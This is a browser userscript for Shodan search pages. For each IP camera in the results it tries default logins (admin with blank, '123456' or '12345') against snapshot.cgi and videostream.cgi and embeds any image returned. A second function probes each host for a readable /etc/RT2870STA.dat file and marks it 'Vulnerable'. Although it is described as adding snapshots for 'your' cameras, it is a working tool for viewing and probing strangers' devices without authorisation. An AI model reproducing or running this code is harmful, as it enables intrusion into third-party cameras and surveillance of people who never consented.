// ==UserScript==
// @name         Shodan Cam Helper
// @namespace    http://ebaumsworld.com/
// @version      0.1
// @description  Adds snapshots for your IP cameras
// @author       joe
// @match        https://www.shodan.io/search?query*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// ==/UserScript==
// 05:29:33
let style = `div.search-result pre {
    font-size: 18px;
}`;
GM_addStyle(style);

var ENABLED_LOGGABLE_VIDEOSTREAM = false;
var ENABLED_SNAPSHOT = true;
var ENABLED_TRAVERSAL = true;
var IPs = [];

var addCredentials = function (type, username, password, url) {
    // url = url.replace("www.shodan.io/host", "");
    if (type == 1) { // add at http
        return url.replace("http://", "http://" + username + ":" + password + "@");
    } else {
        if (url.indexOf("?") > 0) {
            url += "&";
        } else {
            url += "?";
        }
        return url + "user=" + username + "&pwd=" + password;
    }
}


var shodanIPs = document.getElementsByClassName("ip");
var i = 0;
for (i = 0; i < shodanIPs.length; i++) {
    console.log("------------------------------------------");
    var url = shodanIPs[i].getElementsByTagName("a")[0].href;
    url = url.replace("/host", "");
    var videostream = addCredentials(1, "admin", "", url + "videostream.cgi");
    var snapshot = addCredentials(2, "admin", "", url + "snapshot.cgi");
    var snapshot2 = addCredentials(2, "admin", "123456", url + "snapshot.cgi");
    var snapshot3 = addCredentials(2, "admin", "12345", url + "snapshot.cgi");

    console.log("url: ", url);
    console.log("videostream: ", videostream);
    console.log("snapshot: ", snapshot);
    console.log("snapshot2: ", snapshot2);
    console.log("snapshot3: ", snapshot3);

    var addition = "<br />";

    if (ENABLED_LOGGABLE_VIDEOSTREAM) {
        addition += "Loggable: <img src=\"" + videostream + "\" /><br />";
    }
    if (ENABLED_SNAPSHOT) {
        addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot + "\" /><br />";
        addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot2 + "\" /><br />";
        addition += "<img onerror='this.style.display = \"none\"' src=\"" + snapshot3 + "\" /><br />";
    }
    if (ENABLED_TRAVERSAL) {
        addition += "<div class=\"" + url + "\"> </div>";
        IPs.push(url);
    }

    shodanIPs[i].innerHTML += addition;
}

function checkVulnerability() {
    if (IPs.length > 0) {
        var currentIP = IPs.pop();
        GM_xmlhttpRequest({
            url: currentIP + "/etc/RT2870STA.dat",
            method: "GET",
            onload: function (response) {
                console.log("response: ", response);
                var text = "";
                if (response.status == "200") {
                    text = "<b><u>Vulnerable to //proc/kcore!</u></b>";
                } else {
                    text = "Not vulnerable?";
                }
                document.getElementsByClassName(currentIP)[0].innerHTML = text;
                checkVulnerability();
            }
        });
    }
}
